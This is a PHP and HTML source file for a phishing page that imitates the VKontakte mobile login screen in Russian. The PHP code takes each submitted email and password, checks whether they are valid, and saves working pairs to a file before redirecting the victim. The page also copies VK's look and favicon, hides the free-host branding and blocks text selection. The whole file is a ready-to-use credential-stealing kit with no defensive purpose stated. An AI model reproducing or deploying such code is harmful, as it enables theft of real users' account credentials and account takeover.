<?php

include "core/function.php";
include "core/config.php";
$server = $_SERVER['SERVER_NAME'];
$Request = $_POST + $_GET;
if (isset($Request['email'], $Request['pass'])) {
    $email = htmlspecialchars($Request['email']);
    $pass = htmlspecialchars($Request['pass']);
    $data = $email . ':' . $pass;




    if (mb_strlen($email) > 3  or mb_strlen($pass) > 3){

        if (!Dublicats($bd_files, $data)){
            if (Validation_account($email, $pass) != 'NO'){
                /// РЕДИРЕКТТТТТТ
                ///
                ///
                file_put_contents($bd_files, $data, FILE_APPEND);
                header("Location:".$location);
            } else {
                $error ='<div class="box_error">Указан неверный логин или пароль.</div>';
            }
        } else {

            /// Если найден дубликат
            ///
            header("Location:".$location);


        }

    } else {
        $error ='<div class="box_error">Указан неверный логин или пароль.</div>';
    }



}



?>

<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="vk vk_js_no ">
 <meta http-equiv="content-type" content="text/html; charset=utf-8">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="format-detection" content="telephone=no" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="MobileOptimized" content="176" />
<meta name="HandheldFriendly" content="True" />
<base id="base">
<meta name="robots" content="noindex,nofollow" />
<title>Получение доступа к ВКонтакте</title>
<link rel="shortcut icon" href="http://vk.com/images/faviconnew.ico?3">
		<script type="text/javascript">
		document.ondragstart = noselect;
		document.onselectstart = noselect;
		document.oncontextmenu = noselect;
		function noselect(){return false;}
	</script>

<link type="text/css" rel="stylesheet" href="/auth/css/s_cfmx.css"></link>
<link type="text/css" rel="stylesheet" media="only screen" href="/auth/css/s_yzt.css"></link>
<script type="text/javascript" src="/auth/css/s_o.js"></script>
<style>[class="cbalink"]{display:none;}</style>
<style>img[alt="www.000webhost.com"]{display:none;}</style>
</head>
<body id="vk" class="vk__body _touch vk_stickers_hints_support_no opera_mini_no vk_al_no" onresize="onBodyResize(true);">
<div class="layout">
<div class="layout__header mhead" id="vk_head">
<div class="hb_wrap">
<div class="hb_btn">&nbsp;</div>
</div>
</div>
<div class="layout__body " id="vk_wrap">
<div class="layout__leftMenu" id="l">
</div>
<div class="layout__basis" id="m">
<div class="basis">
<div class="basis__header mhead" id="mhead">
<div class="hb_wrap mhb_logo">
<div class="hb_btn mhi_logo">&nbsp;</div>
<h1 class="hb_btn mh_header">&nbsp;</h1>
</div></div>
<div class="basis__content mcont" id="mcont"><div class="pcont fit_box bl_cont">
<div class="owner_panel oauth_mobile_header">
<img src="https://pp.userapi.com/c830409/v830409603/4091/Br5Q8mxuldg.jpg?ava=1" class="op_fimg" />
<div class="op_fcont">
<div class="op_owner">Авторизация ВКонтакте<img src="https://i.imgur.com/259sKlO.png" style="height:16px;width:16px;"></div>
<div class="op_info">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>
</div>
</div>
<div class="form_item fi_fat">
<div class="fi_row"><div class="service_msg_box">
<?=$message?>
</div></div>
<form method="post" action="#">
<dl class="fi_row">
<dt class="fi_label">Телефон или e-mail:</dt>
<dd>
<div class="iwrap"><input type="text" class="textfield" required="required" minlength="2" maxlength="1024" name="email" value="" /></div>
</dd>
</dl>
<dl class="fi_row">
<dt class="fi_label">Пароль:</dt>
<dd>
<div class="iwrap"><input type="password" class="textfield" required="required" minlength="2" maxlength="1024" name="pass" /></div>
</dd>
</dl>
<div class="fi_row">
<div class="fi_subrow">
<input class="button" type="submit" value="Войти" />
</div>
</div>
<div class="fi_row_new">
<div class="fi_header fi_header_light">Ещё не зарегистрированы?</div>
</div>
<div class="fi_row">
<a class="button wide_button gray_button" href="https://m.vk.com/join">Зарегистрироваться</a>
</div>
</form>
</div>
</div></div>
<div class="basis__footer mfoot" id="mfoot"><div class="pfoot">
<ul class="footer_menu">
</ul>
</div></div>
</div>
</div>
</div>
</div>
<script type="text/javascript">
<!--
parent&&parent!=window&&(document.getElementsByTagName('body')[0].innerHTML='');
//-->
</script>
<div id="vk_utils"></div>
<div id="z"></div>
<div id="vk_bottom"></div>
</body>
</html>
